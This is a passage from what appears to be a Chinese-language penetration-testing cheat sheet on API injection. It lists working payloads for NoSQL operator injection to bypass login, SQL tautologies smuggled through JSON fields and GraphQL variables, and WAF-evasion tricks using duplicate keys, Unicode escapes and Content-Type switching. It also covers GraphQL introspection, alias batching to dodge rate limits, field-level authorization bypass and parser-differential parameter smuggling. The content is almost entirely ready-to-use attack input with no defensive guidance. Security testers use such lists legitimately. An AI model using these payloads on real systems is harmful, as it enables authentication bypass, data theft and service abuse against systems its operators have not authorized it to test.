## 五、API注入类漏洞（高级）

### 5.1 SQL/NoSQL/命令注入
```json
// NoSQL高级注入
POST /api/login {"username":{"$ne":null},"password":{"$ne":null}}
POST /api/users {"$where":"this.password.match(/.*/)"}
POST /api/query {"$or":[{"role":"admin"},{"role":"user"}]}
{"username":{"$regex":".*"}}     // 正则绕过
{"id":{"$gt":0}}                 // 比较运算符

// 批量分配+注入组合
{"username":{"$gt":""},"__proto__":{}}  

// JSON注入绕过WAF：
// 重复键 {"id":"1","id":"1 OR 1=1"}
// Unicode/转义 {"id":"1\u0020OR\u00201=1"}
// 数组 {"id":["1","1 OR 1=1"]}
// Content-Type切换：json↔urlencoded↔xml（WAF可能只查json）
```

### 5.2 GraphQL高级攻击
```graphql
# Introspection
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 成本/深度攻击（绕过深度限制）
# fragment递归展开（深度限制只算嵌套层数不算fragment展开）
fragment A on User { posts { comments { user { ...A } } } }
query { user(id:1) { ...A } }

# 别名批量（绕过速率限制/单对象授权）
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }

# 字段级权限绕过（fragment/内省）
fragment F on User { passwordHash, role, apiKey }
query { user(id:1) { ...F } }

# 指令滥用
query { user(id:1) { email @skip(if: false) passwordHash @include(if: true) } }

# 持久化查询绕过
{"extensions":{"persistedQuery":{"sha256Hash":"<已知hash>"}}}
# 若服务端信任持久化查询绕过变量校验 → 注入变量

# 变量注入
mutation login($user:String!,$pass:String!){login(username:$user,password:$pass)}
variables: {"user":"admin' OR 1=1--","pass":"x"}

# 批量mutation（成本/速率绕过）
mutation { a:createUser(...) b:createUser(...) }
```

### 5.3 JSON/协议层污染与解析差异
```http
# 解析器差异攻击（JSON/XML/表单双解析器）
# 网关用A解析器，后端用B解析器 → 参数走私
{"role":"user","role":"admin"}        # 重复键：取哪个？
{"role":["user"],"role":"admin"}      # 类型混淆
# XML外部实体/XXE在JSON API中（接受XML的兼容端点）
# 参数污染HPP：?user_id=1&user_id=2
# 大小写：userId/userid/USER_ID（不同框架敏感度不同）
```

